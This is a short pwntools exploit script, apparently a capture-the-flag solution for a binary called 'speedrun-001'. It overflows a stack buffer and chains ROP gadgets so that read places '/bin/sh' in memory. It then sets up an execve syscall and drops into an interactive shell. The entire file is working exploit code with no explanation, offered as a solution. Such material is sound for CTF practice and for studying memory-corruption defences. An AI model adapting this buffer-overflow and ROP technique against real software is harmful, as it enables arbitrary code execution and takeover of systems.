#!/usr/bin/env python
# coding=utf-8
from pwn import *
a=process("./speedrun-001")
elf=ELF("./speedrun-001")
context.terminal=["tmux","splitw","-h"]
#mprotect_addr=elf.symbols["mprotect"]
def debug():
    gdb.attach(a,'''
    b *0x000000000400B8B
    ''')
offset=0x408

a.recvuntil("Any last words?\n")
pop_rdi_ret=0x0000000000400686
pop_rsi_ret=0x00000000004101f3
pop_rdx_ret=0x00000000004498b5
read_addr=0x0000000004498A0
syscall=0x0000000004498E2

bss_addr=0x6BB320

payload='A'*offset
payload+=p64(pop_rdi_ret)
payload+=p64(0)
payload+=p64(pop_rsi_ret)
payload+=p64(bss_addr)
payload+=p64(pop_rdx_ret)
payload+=p64(0x100)
payload+=p64(read_addr)
payload+=p64(pop_rdi_ret)
payload+=p64(bss_addr)
payload+=p64(pop_rsi_ret)
payload+=p64(0)
payload+=p64(pop_rdx_ret)
payload+=p64(0)
payload+=p64(syscall)

a.sendline(payload)
a.recv()
raw_input("GO???")

payload='/bin/sh\x00'
payload=payload.ljust(59,'\x00')
a.send(payload)
a.interactive()